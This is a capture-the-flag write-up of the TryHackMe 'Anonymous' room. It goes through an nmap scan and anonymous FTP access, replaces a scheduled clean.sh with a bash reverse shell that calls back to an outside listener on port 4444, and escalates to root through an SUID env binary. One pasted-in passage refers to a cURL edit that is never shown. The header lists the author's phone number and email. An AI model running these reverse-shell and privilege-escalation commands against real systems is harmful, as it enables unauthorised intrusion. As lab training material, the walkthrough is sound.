
  
'''''''''''''''''''''''''''''''''''''''''''''''''''''''
''
'' 		Try Hack Me : Anonymous
'' 			
''
''		Try Hack Me , My User Name : Lime1O1
'' 			
''		URL: https://tryhackme.com/room/anonymous

		Difficulty: Medium 

		Author: Lime1O1

''
''		Phone : 01026102300
''
''		Email : Lime1O1Red@gmail.com 
''
''		Facebook : https://www.facebook.com/profile.php?id=100070215322755 
''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


NMAP Scan

		
		$ nmap -sC -sV IP

		As always we begin our enumeration with an NMAP scan. I’ve condensed it slightly to lessen the output:

##########################################################################################################


PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Sep 26 01:43 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.47.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-09-26T02:12:13+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-26T02:12:13
|_  start_date: N/A

#######################################################################################################################################

WE HAVE 4 PORTS ARE OPEN :
	
	############

	1- 21 => ftp 
	2- 22 => ssh
	3- 139,445

	#############

I will start by investigating the FTP port (21). According to our portscan, Anonymous login is allowed:

Anonymous FTP login allowed


$ ftp IP 
$ username : Anonymous
$ ls
	
	There is a directory called scripts.

$ cd /scripts
$ ls 

	get clean.sh
	get removed_files.log
	get to_do.txt

$ mget * 

Transfer all the files over to the local machine so we can inspect them.

exit from ftp 

$ exit 

#########################################################################################

$ cat clean.sh


	#!/bin/bash

	tmp_files=0
	echo $tmp_files
	if [ $tmp_files=0 ]
	then
	        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
	else
	    for LINE in $tmp_files; do
	        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
	fi









'''''''''''''''''''
		Its a simple if/else statement that executes an echo statment that gets redirected into our log, based on the value of a defined variable. What the script is doing isn’t actually the important bit, the important bit is that, as well as read access to the file, also have permission to modify it. Attempts to download the script locally, modify it and re-upload seemingly failed, likely because the re-uploaded file doesn’t retain the right user permissions– by default the file is owned by UID/GID 1000, if we re-upload the file this number changes to something else.

		That said, we can modify files directly on the FTP server. I used lftp here because I have mad issues with the standard Linux FTP binary if active mode is being used (it’s a FW problem I’ve not fixed yet):

		lftp anonymous@10.10.210.243:/scripts> edit clean.sh

		This opens the file up in vim – note this is a local instance of vim, so breaking out of it is going to put you into a shell on your own local machine – and from there we can edit it. For testing purposes I added a simple cURL command to the bottom of the file:
'''''''''''''''''''




#################################################################################################################

$ cat to_do.txt


	I really need to disable the anonymous login...it's really not safe

####################################################################################################################

$ cat removed_files.log 

	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	Running cleanup script:  nothing to delete
	
########################################################################################################################


Since the FTP allows for anyone to log in, we can upload our own script with an identical name. So let’s start by creating our own script on our local machine.

Refer to this article for a reverse shell cheatsheet:

Reverse Shell Cheatsheet - CyberGoat

We’ll be using this one-liner:

	bash -i >& /dev/tcp/[YOUR TRYHACKME IP ADDRESS]/4444 0>&1


Look at your interfaces with ifconfig, your TryHackMe IP should be on interface “tun0” on similar.

Create the file


##############################################

#!/bin/bash
bash -i >& /dev/tcp/10.9.6.63/4444 0>&1

##############################################

Connect to the FTP server again:

$ ftp 10.10.37.186
$ Anonymous
$ cd scripts
$ put clean.sh


$nc -nvlp 4444


I am logged in as “namelessone”. The user flag is in the user’s home directory:




################################################################################################

Privilege Escalation : 

Pretty straight forward so far. Just modifying the script to get a reverse shell.

sudo -l doesn’t work so let’s check the SUID binaries. If you are unsure about finding and exploiting SUID binaries, I recommend reading this article:

Null Byte - Exploit SUID Binaries

And here is a very recent TryHackMe box which included the exploitation of a SUID Binary:

CyberGoat - BoilerCTF TryHackMe

To get a list of all SUID binaries, execute the following command:




$ find / -user root -perm -4000 -print 2>/dev/null
$ /usr/bin/env /bin/sh -p
$ cd /root 


We are root, the flag is in /root/root.txt
now you are root | 

